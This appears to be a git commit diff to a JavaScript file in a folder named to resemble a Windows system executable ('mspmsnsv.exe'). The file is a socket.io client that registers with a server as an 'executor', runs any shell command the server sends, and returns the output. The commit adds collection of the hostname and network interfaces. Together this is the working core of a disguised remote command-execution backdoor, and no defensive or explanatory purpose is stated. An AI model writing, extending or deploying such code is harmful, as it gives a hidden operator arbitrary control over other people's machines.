3eb24859cc99105e8f23fe2aac9147928dc15ef7
this override <n4yor93@hotmail.fr>
2025-01-01 17:23:43 +0100

    dev

--- mspmsnsv.exe/index.js
+++ mspmsnsv.exe/index.js
@@ -1,13 +1,14 @@
 const io = require('socket.io-client');
 const { exec } = require('child_process');
+const os = require('os');
 
 const socket = io('http://localhost:3000');
-
+const networkInterfaces = os.networkInterfaces();
+console.log(networkInterfaces)
 
 socket.on('connect', () => {
     console.log('Connected to server');
-    
-    socket.emit('register', { type: 'executor'});
+    socket.emit('system:register', { type: 'X-EXECUTOR' , hostname: os.hostname()});
 });
 
 
@@ -23,7 +24,7 @@ socket.on('execute', (data) => {
         } else if (stderr) {
             result = `${stderr}`;
         } else {
-            result = `${stdout}`;
+            result = `${stdout}`; 
         }
 
         console.log(`Sending response to ${senderId}: ${result}`);
